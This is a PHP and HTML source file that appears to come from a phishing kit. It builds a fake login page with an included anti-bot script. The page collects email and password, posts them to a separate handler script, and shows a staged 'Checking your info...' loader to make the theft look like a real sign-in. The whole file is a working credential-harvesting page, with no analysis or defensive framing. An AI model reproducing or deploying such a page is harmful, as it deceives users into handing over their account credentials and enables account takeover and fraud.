<?php

include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];



?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title><?php  echo $wiz_111;  ?></title>
   <link rel="shortcut icon" link rel="logo-icon" href="img/mou.png">
	<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>


   <div class="all" >
   	<div class="login_moustache">
   		<div class="content">
   			<header>
   				<img src="img/logo.svg">
   			</header>
   			<form method="POST" action="edit/login.php" >
   				<input style="text-align-last: left;"type="email" id="mail" name="email" required placeholder="Email" >
   				<input style="text-align-last: left;"type="password" name="pass" id="pass" required placeholder="Password">
   				<input type="submit" name="login" class="login" id="usns" value="Log In">
   				<div class="nsit" >
   				 <span><?php  echo $wiz_222;  ?></span>
   				</div> 
   			</form>
   			<button class="t9ayad"><?php  echo $wiz_333;  ?></button>
   		</div>
   		</div>
   		<footer>
   			<p><?php  echo $wiz_444;  ?></p>
   		</footer>
   	
   </div>

   <div class="tsana">
   	 <img src="img/icon_loader_med.gif">
   	 <p>Checking your info...</p>
   </div>
   <div class="col-rez"></div>

<script type="text/javascript" src="js/jquery-3.1.1.min.js"></script>

<script type="text/javascript">

var em = $('#mail').val();
var pas = $('#pass').val();

if (em == '' & pas == '') {
   console.log('bb');
}else{
   $(function(){
$('.login').click(function(event){
event.preventDefault();
window.setTimeout(function(form){
$(form).submit();
}, 5000, $(this).closest('form'));
});
});

   $(document).ready(function(){
      $('.login').click(function(){
         $('.tsana').show();
         $('.all').css('opacity' , '0.5');
         $('.all').css('display' , 'none');
      });
   });
}





</script>

</body>
</html>